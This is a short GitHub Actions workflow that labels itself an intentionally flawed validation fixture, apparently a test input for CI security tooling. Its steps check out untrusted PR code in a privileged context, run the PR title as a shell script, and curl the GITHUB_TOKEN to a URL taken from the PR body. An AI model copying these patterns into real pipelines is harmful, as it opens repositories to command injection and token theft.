name: intentionally flawed validation fixture
on:
  pull_request_target:
    types: [opened, synchronize]

permissions:
  contents: write
  pull-requests: write

jobs:
  unsafe-review:
    runs-on: ubuntu-latest
    steps:
      - name: Check out untrusted head in privileged context
        uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.ref }}

      - name: Execute pull request title as shell
        run: |
          printf '%s
' "${{ github.event.pull_request.title }}" > /tmp/pr-title.sh
          bash /tmp/pr-title.sh

      - name: Forward token to caller-controlled URL
        run: |
          curl -fsS -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"
